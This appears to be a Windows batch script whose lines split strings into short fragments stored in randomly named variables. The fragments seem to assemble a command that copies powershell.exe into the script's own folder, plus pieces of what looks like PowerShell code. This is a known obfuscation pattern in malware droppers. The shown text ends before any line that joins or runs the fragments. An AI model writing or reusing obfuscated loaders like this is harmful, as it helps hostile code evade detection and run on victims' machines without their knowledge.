@echo off
set "oBkDquYmNJ=po"
set "bEPPXcmXQf=rs"
set "GSFIxfrLLy=do"
set "CCXXtVZcHa=he"
set "FcCaShCtHR=0\"
set "oPpeQRRiMM=co"
set "oqatWvWFhJ=y "
set "FEthVWxXfD=ll"
set "QyVmwlqGMc=ow"
set "LrUFUjFyfZ=ws"
set "AeJewBlHLe=st"
set "TewIcJJibz=em"
set "bwhCuWzMsE=Po"
set "TSIczpbGhO=Sy"
set "qGIWhBYeqm=:\"
set "xVOvIEbsmA= C"
set "jWUaOkLcoA=he"
set "eOXInfVEOH=\v"
set "quNXsYPTMg=32"
set "irrxaqbGfy=s\"
set "uWOMGtypOy= /"
set "SZDTDgvHKb=py"
set "xkFXuGUTip=1."
set "baFcPsbTvl=nd"
set "kKzYCdImaz=\W"
set "IIfzbzOVXx=ll"
set "MWACNMzpgu=rS"
set "igFsPKMuGo=.e"
set "hbwHhLiqnh=xe"
set "euUbEOvaZP=in"
set "ogoGduYvNo=we"
set "ahThqkLjKk=Wi"
set "DPTXzrfQAx=we"
set "ziZjiQMaIL= %~dp0"
set "neQmLWZLok=cd"
set "cjClYmcpDq=k; }"
set "SeEYaQGyuy=();$"
set "TRFhPurArP=('l0"
set "YHALEQQIwC=TllA"
set "mqATzRfktA=pdm."
